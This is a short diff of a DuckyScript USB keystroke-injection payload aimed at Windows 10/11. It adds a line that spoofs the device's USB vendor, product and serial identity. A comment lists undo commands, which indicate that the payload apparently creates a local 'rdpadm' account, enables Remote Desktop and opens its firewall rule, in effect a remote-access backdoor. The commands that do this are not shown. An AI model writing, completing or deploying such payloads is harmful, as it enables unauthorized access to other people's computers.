@@ -5,6 +5,9 @@ REM Target: Windows 10/11
 
 REM Comment: Undo commands with: Remove-LocalUser rdpadm;Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0; Disable-NetFirewallRule -DisplayGroup 'Remote Desktop';
 
+REM Configure USB device identity (processed before compilation)
+ATTACKMODE HID VID_16c0 PID_27db MAN_DigiKey PROD_ATTiny85_Ducky SERIAL_1337
+
 DUCKY_LANG US
 DEFINE #HID_DELAY 1200
 
